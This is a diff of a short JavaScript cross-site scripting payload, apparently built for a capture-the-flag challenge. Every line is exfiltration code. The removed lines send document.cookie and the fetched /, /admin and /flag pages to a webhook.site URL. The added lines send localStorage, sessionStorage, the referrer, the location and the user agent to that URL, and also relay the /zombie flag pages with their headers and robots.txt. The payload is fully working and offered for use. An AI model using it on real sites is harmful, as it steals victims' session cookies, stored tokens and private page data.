@@ -1,6 +1,10 @@
 var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
-fetch(w+'/cookie?d='+encodeURIComponent(document.cookie));
-fetch('/').then(r=>r.text()).then(t=>fetch(w+'/page?d='+encodeURIComponent(t)));
-fetch('/admin').then(r=>r.text()).then(t=>fetch(w+'/admin?d='+encodeURIComponent(t)));
-fetch('/flag').then(r=>r.text()).then(t=>fetch(w+'/flag?d='+encodeURIComponent(t)));
-fetch('/zombie').then(r=>r.text()).then(t=>fetch(w+'/zombie?d='+encodeURIComponent(t)))
+fetch(w+'/ls?d='+encodeURIComponent(JSON.stringify(localStorage)));
+fetch(w+'/ss?d='+encodeURIComponent(JSON.stringify(sessionStorage)));
+fetch(w+'/title?d='+encodeURIComponent(document.title));
+fetch(w+'/loc?d='+encodeURIComponent(location.href));
+fetch(w+'/ref?d='+encodeURIComponent(document.referrer));
+fetch(w+'/ua?d='+encodeURIComponent(navigator.userAgent));
+fetch('/zombie?show=flag').then(r=>{var h='';r.headers.forEach((v,k)=>h+=k+':'+v+'|');r.text().then(t=>fetch(w+'/zflag?d='+encodeURIComponent(t)+'&h='+encodeURIComponent(h)))});
+fetch('/zombie?show=wctf').then(r=>r.text()).then(t=>fetch(w+'/zwctf?d='+encodeURIComponent(t)));
+fetch('/robots.txt').then(r=>r.text()).then(t=>fetch(w+'/robots?d='+encodeURIComponent(t)));
